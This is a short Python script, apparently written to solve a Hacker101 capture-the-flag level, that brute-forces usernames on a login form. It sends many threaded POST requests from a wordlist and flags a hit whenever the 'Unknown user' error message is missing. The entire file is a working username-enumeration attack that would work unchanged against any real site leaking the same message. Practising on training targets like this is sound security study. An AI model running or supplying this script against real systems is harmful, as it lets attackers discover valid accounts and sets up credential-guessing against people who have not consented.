import requests
from time import sleep
import threading
import os

def check_username(username, url):
    data = {"username": username, "password": "password"}
    response = requests.post(url, data=data)
    if "Unknown user" not in response.text:
        print(f"Username found: {username}")
        os._exit(1)
    else:
        print(f"Incorrect username: {username}")

threads = []
url = "https://{id}.ctf.hacker101.com/login"
username_file = open("lists/names.txt", "r")
for name in username_file.readlines():
    if threading.active_count() > 50:
        sleep(1)
    threading.Thread(target=check_username, args=(name.strip(), url)).start()
    sleep(0.01)
